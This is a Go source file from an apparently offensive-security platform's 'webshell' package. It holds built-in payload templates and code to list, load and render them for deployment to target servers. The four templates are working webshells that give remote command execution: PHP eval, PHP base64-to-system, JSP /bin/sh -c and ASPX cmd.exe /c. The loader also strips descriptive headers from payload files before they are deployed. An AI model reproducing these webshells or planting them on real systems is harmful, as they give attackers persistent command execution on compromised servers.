package webshell

// 载荷模板：内置一份「最小可用」的，允许用自备库覆盖。
//
// 立场说明：内置模板只用于验证链路（这条会话是不是真的能执行），不是免杀载荷。
// 真要对抗目标侧的 WAF/EDR，应当由测评人自备马，通过 POJUN_WEBSHELL_PAYLOAD_DIR
// 指向自己的库——平台不承担「生成能过 WAF 的马」这个职责，那既不是代码能力问题，
// 也不该固化在工具里。
//
// 自备库的目录约定与 artex-full 一致：
//
//	<dir>/php/<file>.php   —— type=php 或 php_raw
//	<dir>/jsp/<file>.jsp   —— type=jsp
//	<dir>/aspx/<file>.aspx —— type=aspx
//
// 文件头可写 /* @summary … / @scene … / @perm … / @param … */，下发前会被剥掉
// （落到目标上的文件不带说明书）。

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
)

// ParamPlaceholder 是模板里参数名的占位符。
const ParamPlaceholder = "{{PARAM}}"

// Template 是一份可下载/可渲染的载荷。
type Template struct {
	// Name 是稳定标识：内置用 builtin/<key>，自备用 <type>/<file>。
	Name string `json:"name"`
	// Type 是它对应的会话类型（php / php_raw / jsp / aspx）。
	Type string `json:"type"`
	// File 是文件名（自备库才有意义）。
	File string `json:"file,omitempty"`
	// Summary / Scene / Perm 来自文件头注释，没写就为空。
	Summary string `json:"summary,omitempty"`
	Scene   string `json:"scene,omitempty"`
	Perm    string `json:"perm,omitempty"`
	// Builtin 表示来自内置表而不是自备库。
	Builtin bool `json:"builtin"`
	// Size 是渲染后（含占位符）的字节数。
	Size int `json:"size"`

	body string // 含占位符的原始内容，不序列化（避免把载荷随手带进 API 响应）
}

// Body 返回含占位符的载荷全文（仅给 detail 接口用）。
func (t Template) Body() string { return t.body }

var (
	tplTagRE     = regexp.MustCompile(`@(summary|scene|perm)\s+(.+)`)
	tplHeadRE    = regexp.MustCompile(`(?s)^\s*/\*.*?\*/`)
	tplFileRE    = regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9._-]*$`)
)

// builtinTemplates 是最小可用载荷。参数名统一用 {{PARAM}} 占位，渲染时替换。
func builtinTemplates() []Template {
	return []Template{
		{
			Name:    "builtin/php-eval",
			Type:    "php",
			File:    "eval.php",
			Summary: "PHP eval 型，接受任意 PHP 代码（平台会自动按 eval 协议下发）",
			Scene:   "目标为 PHP 站点，需要命令执行与文件读写",
			Perm:    "继承 Web 进程用户（通常 www-data / nginx）",
			body:    "<?php @eval($_POST['" + ParamPlaceholder + "']);?>",
			Builtin: true,
		},
		{
			Name:    "builtin/php-b64cmd",
			Type:    "php",
			File:    "b64cmd.php",
			Summary: "PHP 命令型：POST 内容按 base64 解码后交给 system（走平台的 raw 模式）",
			Scene:   "eval 被 disable_functions 禁掉、但 system/exec 仍可用",
			Perm:    "继承 Web 进程用户",
			body:    "<?php @system(base64_decode($_POST['" + ParamPlaceholder + "']));?>",
			Builtin: true,
		},
		{
			Name:    "builtin/jsp-cmd",
			Type:    "jsp",
			File:    "cmd.jsp",
			Summary: "JSP 命令型：参数为命令行，经 /bin/sh -c 执行并回显 stdout",
			Scene:   "目标为 Java 容器（Tomcat/WebLogic/Spring Boot 内嵌）",
			Perm:    "继承容器进程用户（常见 root 或应用账号）",
			body: `<%@ page import="java.io.*" %><%` + "\n" +
				`String c = request.getParameter("` + ParamPlaceholder + `");` + "\n" +
				`Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c});` + "\n" +
				`BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(),"UTF-8"));` + "\n" +
				`StringBuilder sb = new StringBuilder(); String l;` + "\n" +
				`while((l = br.readLine()) != null){ sb.append(l).append("\n"); }` + "\n" +
				`br.close(); out.print(sb.toString());` + "\n" + `%>`,
			Builtin: true,
		},
		{
			Name:    "builtin/aspx-cmd",
			Type:    "aspx",
			File:    "cmd.aspx",
			Summary: "ASPX 命令型：参数为命令行，经 cmd.exe /c 执行并回显 stdout",
			Scene:   "目标为 IIS + .NET（注意：ASPX 马落地即被 w3wp 编译，会留临时文件）",
			Perm:    "继承 w3wp 应用池身份（常见 IIS APPPOOL\\xxx）",
			body: `<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%` + "\n" +
				`string c = Request["` + ParamPlaceholder + `"];` + "\n" +
				`ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + c);` + "\n" +
				`psi.RedirectStandardOutput = true; psi.UseShellExecute = false;` + "\n" +
				`Process p = Process.Start(psi);` + "\n" +
				`Response.Write(p.StandardOutput.ReadToEnd()); p.WaitForExit();` + "\n" + `%>`,
			Builtin: true,
		},
	}
}

// PayloadDir 返回自备载荷库目录（环境变量优先）。
func PayloadDir() string { return strings.TrimSpace(os.Getenv(PayloadDirEnv)) }

// ListTemplates 列出内置 + 自备库。自备库同名（同 type/同文件名）时覆盖内置。
func ListTemplates() []Template {
	out := builtinTemplates()
	dir := PayloadDir()
	if dir == "" {
		return out
	}
	for _, typ := range ValidPayloadTypes() {
		sub := filepath.Join(dir, typ)
		ents, err := os.ReadDir(sub)
		if err != nil {
			continue
		}
		names := make([]string, 0, len(ents))
		for _, e := range ents {
			if e.IsDir() || !tplFileRE.MatchString(e.Name()) {
				continue
			}
			names = append(names, e.Name())
		}
		sort.Strings(names)
		for _, name := range names {
			raw, err := os.ReadFile(filepath.Join(sub, name))
			if err != nil {
				continue
			}
			t := Template{
				Name:    typ + "/" + name,
				Type:    typ,
				File:    name,
				Size:    len(raw),
				Builtin: false,
			}
			body, meta := stripPayloadHeader(string(raw))
			t.body = body
			t.Summary, t.Scene, t.Perm = meta.summary, meta.scene, meta.perm
			out = append(out, t)
		}
	}
	return out
}

// ValidPayloadTypes 是载荷库里允许的子目录名。
func ValidPayloadTypes() []string { return []string{"php", "jsp", "aspx"} }

// payloadMeta 是文件头注释里的元信息。
type payloadMeta struct{ summary, scene, perm string }

// stripPayloadHeader 剥掉开头的 /**/ 说明块，并从里面抽 @summary/@scene/@perm。
// 落到目标上的文件不该带说明书——那等于把「这是什么、怎么用」一起交出去。
func stripPayloadHeader(content string) (string, payloadMeta) {
	var meta payloadMeta
	head := tplHeadRE.FindString(content)
	if head == "" {
		return content, meta
	}
	for _, line := range strings.Split(head, "\n") {
		if m := tplTagRE.FindStringSubmatch(line); m != nil {
			v := strings.TrimSpace(strings.TrimPrefix(strings.TrimSpace(m[2]), "*"))
			v = strings.TrimSpace(strings.TrimRight(v, "*/"))
			switch m[1] {
			case "summary":
				meta.summary = v
			case "scene":
				meta.scene = v
			case "perm":
				meta.perm = v
			}
		}
	}
	return strings.TrimSpace(tplHeadRE.ReplaceAllString(content, "")), meta
}

// GetTemplate 按名字取模板（含全文）。
func GetTemplate(name string) (Template, error) {
	name = strings.TrimSpace(name)
	for _, t := range ListTemplates() {
		if t.Name == name || t.File == name {
			return t, nil
		}
	}
	return Template{}, fmt.Errorf("%w：载荷模板 %q 不存在（先 payload_list 看可用项）", ErrNotFound, name)
}

// Render 把模板里的占位符换成实际参数名，返回可直接落地的载荷全文。
func (t Template) Render(param string) string {
	p := strings.TrimSpace(param)
	if p == "" {
		p = "pass"
	}
	return strings.ReplaceAll(t.body, ParamPlaceholder, p)
}
